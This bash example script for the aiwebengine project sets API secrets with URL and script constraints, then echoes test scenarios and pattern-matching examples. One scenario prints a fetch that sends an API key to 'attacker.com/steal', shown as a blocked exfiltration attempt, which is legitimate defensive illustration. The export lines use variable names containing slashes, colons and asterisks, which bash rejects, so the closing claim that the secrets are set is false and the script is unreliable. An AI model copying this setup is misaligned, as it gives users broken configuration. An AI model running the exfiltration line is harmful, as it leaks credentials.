#!/bin/bash

# Example: Setting up constrained secrets for aiwebengine

echo "=== Secret Access Control Examples ==="
echo ""

# Example 1: Anthropic API - only for AI scripts
echo "1. Anthropic API Key (AI scripts only)"
export SECRET_ANTHROPIC_API_KEY__ALLOW_https://api.anthropic.com/*__SCRIPT_/scripts/ai/*="sk-ant-api03-your-key-here"
echo "   ✓ Set: Only /scripts/ai/* can call https://api.anthropic.com/*"
echo ""

# Example 2: GitHub API - only for integration scripts  
echo "2. GitHub Token (integration scripts only)"
export SECRET_GITHUB_TOKEN__ALLOW_https://api.github.com/*__SCRIPT_/scripts/integrations/github*="ghp_your_token_here"
echo "   ✓ Set: Only /scripts/integrations/github* can call https://api.github.com/*"
echo ""

# Example 3: SendGrid API - only for email scripts
echo "3. SendGrid API Key (email scripts only)"
export SECRET_SENDGRID_API_KEY__ALLOW_https://api.sendgrid.com/*__SCRIPT_/scripts/email/*="SG.your_key_here"
echo "   ✓ Set: Only /scripts/email/* can call https://api.sendgrid.com/*"
echo ""

# Example 4: Stripe API - only for payment scripts
echo "4. Stripe API Key (payment scripts only)"
export SECRET_STRIPE_KEY__ALLOW_https://api.stripe.com/*__SCRIPT_/scripts/payments/*="sk_test_your_key_here"
echo "   ✓ Set: Only /scripts/payments/* can call https://api.stripe.com/*"
echo ""

# Example 5: Internal API - unrestricted (backward compatible)
echo "5. Internal API Key (unrestricted - old format)"
export SECRET_INTERNAL_KEY="internal_value_123"
echo "   ✓ Set: All scripts can use this (no constraints)"
echo ""

# Example 6: Multi-subdomain wildcard
echo "6. AWS API Key (all AWS services)"
export SECRET_AWS_KEY__ALLOW_https://*.amazonaws.com/*__SCRIPT_/scripts/cloud/*="AKIA_your_key_here"
echo "   ✓ Set: /scripts/cloud/* can call https://*.amazonaws.com/*"
echo ""

echo "=== Security Test Scenarios ==="
echo ""

# Test 1: Legitimate usage
echo "Test 1: AI script calling Anthropic API"
echo "  fetch('https://api.anthropic.com/v1/messages', {"
echo "    headers: { 'Authorization': 'Bearer {{secret:anthropic_api_key}}' }"
echo "  })"
echo "  ✓ ALLOWED: URL and script match constraints"
echo ""

# Test 2: Exfiltration attempt
echo "Test 2: AI script trying to exfiltrate to attacker"
echo "  fetch('https://attacker.com/steal', {"
echo "    headers: { 'X-Secret': '{{secret:anthropic_api_key}}' }"
echo "  })"
echo "  ✗ BLOCKED: URL does not match constraint"
echo "  └─ Error: Secret 'anthropic_api_key' not allowed for URL: https://attacker.com/steal"
echo ""

# Test 3: Wrong script
echo "Test 3: Wrong script trying to use GitHub token"
echo "  fetch('https://api.github.com/repos', {"
echo "    headers: { 'Authorization': 'Bearer {{secret:github_token}}' }"
echo "  })"
echo "  ✗ BLOCKED: Script URI does not match constraint"
echo "  └─ Error: Secret 'github_token' not allowed for script: /scripts/malicious.js"
echo ""

# Test 4: Case insensitive URL
echo "Test 4: Case variations in URL (should work)"
echo "  fetch('https://API.ANTHROPIC.COM/v1/messages', {"
echo "    headers: { 'Authorization': 'Bearer {{secret:anthropic_api_key}}' }"
echo "  })"
echo "  ✓ ALLOWED: URLs are case-insensitive"
echo ""

# Test 5: Case sensitive script
echo "Test 5: Case variations in script URI (should fail)"
echo "  Script: /scripts/AI/chat.js"
echo "  Pattern: /scripts/ai/*"
echo "  ✗ BLOCKED: Script URIs are case-sensitive"
echo ""

echo "=== Pattern Matching Examples ==="
echo ""
echo "Pattern: https://api.github.com/*"
echo "  ✓ Matches: https://api.github.com/repos"
echo "  ✓ Matches: https://api.github.com/users/octocat"
echo "  ✗ Fails:   https://github.com/repos"
echo "  ✗ Fails:   https://attacker.com"
echo ""

echo "Pattern: /scripts/*/integrations.js"
echo "  ✓ Matches: /scripts/github/integrations.js"
echo "  ✓ Matches: /scripts/slack/integrations.js"
echo "  ✗ Fails:   /scripts/integrations.js"
echo "  ✗ Fails:   /scripts/github/other.js"
echo ""

echo "Pattern: https://*.example.com/v*/api"
echo "  ✓ Matches: https://api.example.com/v1/api"
echo "  ✓ Matches: https://beta.example.com/v2/api"
echo "  ✗ Fails:   https://example.com/v1/api (no subdomain)"
echo "  ✗ Fails:   https://api.example.com/api (no version)"
echo ""

echo "=== Start aiwebengine with these secrets ==="
echo ""
echo "The secrets are now set in your environment."
echo "When you start aiwebengine, they will be loaded automatically."
echo ""
echo "To verify:"
echo "  cargo run"
echo ""
echo "Monitor logs for constraint violations:"
echo "  tail -f logs/app.log | grep 'Secret access constraint violation'"
